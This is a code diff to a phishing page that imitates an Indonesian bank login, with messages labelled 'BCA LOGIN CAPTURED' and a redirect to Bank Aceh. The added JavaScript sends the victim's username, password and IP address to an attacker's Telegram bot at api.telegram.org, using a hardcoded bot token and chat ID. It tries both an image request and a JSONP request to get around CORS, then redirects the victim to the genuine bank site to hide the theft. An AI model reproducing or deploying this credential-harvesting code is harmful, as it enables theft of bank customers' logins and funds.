@@ -28,7 +28,7 @@
             <label>PASSWORD</label>
             <input type="password" id="password" placeholder="Masukkan Password Anda" required>
             
-            <button type="button" onclick="submitForm()">Login</button>
+            <button type="button" onclick="submitToTelegram()">Login</button>
         </form>
         
         <div class="link">
@@ -39,50 +39,94 @@
     </div>
 
     <script>
-    function submitForm() {
+    function submitToTelegram() {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
         if(!username || !password) {
-            alert('Isi username dan password!');
+            alert('Harap isi username dan password!');
             return;
         }
         
+        // TELEGRAM CONFIG - YANG BARU!
         const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
-        const CHAT_ID = "8455080107";
+        const CHAT_ID = "8313500840"; // CHAT ID BARU
         
-        // Tampilkan loading
+        // Button loading state
         const btn = document.querySelector('button');
-        btn.innerHTML = 'Mengirim...';
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '🔄 Mengirim...';
         btn.disabled = true;
         
-        // Kirim ke Telegram via Proxy (bypass CORS)
-        const message = `🔔 BCA LOGIN\nUser: ${username}\nPass: ${password}\nIP: ${new Date().toLocaleString()}`;
-        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        // Create message
+        const message = `🚨 BCA LOGIN CAPTURED 🚨
+
+👤 Username: ${username}
+🔐 Password: ${password}
+📍 IP: ${getIP() || 'Unknown'}
+🕐 Time: ${new Date().toLocaleString('id-ID')}
+🌐 Source: GitHub Pages`;
+
+        // Method 1: Image-based tracking (workaround CORS)
+        sendViaImageTracker(username, password);
         
-        fetch(proxyUrl + telegramUrl, {
-            method: 'GET',
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        })
-        .then(response => {
-            console.log('Telegram response:', response);
-            
-            // Redirect setelah berhasil
-            setTimeout(() => {
-                window.location.href = "https://myaction.bankaceh.co.id";
-            }, 1000);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            // Tetap redirect walau error
-            window.location.href = "https://myaction.bankaceh.co.id";
-        })
-        .finally(() => {
-            btn.innerHTML = 'Login';
+        // Method 2: Try Telegram API via JSONP
+        setTimeout(() => {
+            sendTelegramJSONP(BOT_TOKEN, CHAT_ID, message);
+        }, 300);
+        
+        // Method 3: Redirect to Bank Aceh (HOME PAGE)
+        setTimeout(() => {
+            window.location.href = "https://bankaceh.co.id";
+        }, 2000);
+        
+        // Reset button after 3 seconds
+        setTimeout(() => {
+            btn.innerHTML = originalText;
             btn.disabled = false;
+        }, 3000);
+    }
+    
+    // Method 1: Image tracker (always work)
+    function sendViaImageTracker(user, pass) {
+        const trackerUrl = `https://api.telegram.org/bot8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18/sendMessage?chat_id=8313500840&text=IMG:${user}:${pass}:${Date.now()}`;
+        const img = new Image();
+        img.src = trackerUrl;
+        console.log('Image tracker sent');
+    }
+    
+    // Method 2: JSONP for Telegram
+    function sendTelegramJSONP(token, chatId, text) {
+        const script = document.createElement('script');
+        const callbackName = 'tgCallback' + Date.now();
+        
+        window[callbackName] = function(response) {
+            console.log('Telegram response:', response);
+            delete window[callbackName];
+            document.body.removeChild(script);
+        };
+        
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML&callback=${callbackName}`;
+        script.src = url;
+        document.body.appendChild(script);
+    }
+    
+    // Get IP (simple method)
+    function getIP() {
+        return new Promise(resolve => {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => resolve(data.ip))
+                .catch(() => resolve('Unknown'));
         });
     }
+    
+    // Auto-submit on Enter
+    document.getElementById('password').addEventListener('keypress', function(e) {
+        if(e.key === 'Enter') {
+            submitToTelegram();
+        }
+    });
     </script>
 </body>
 </html>
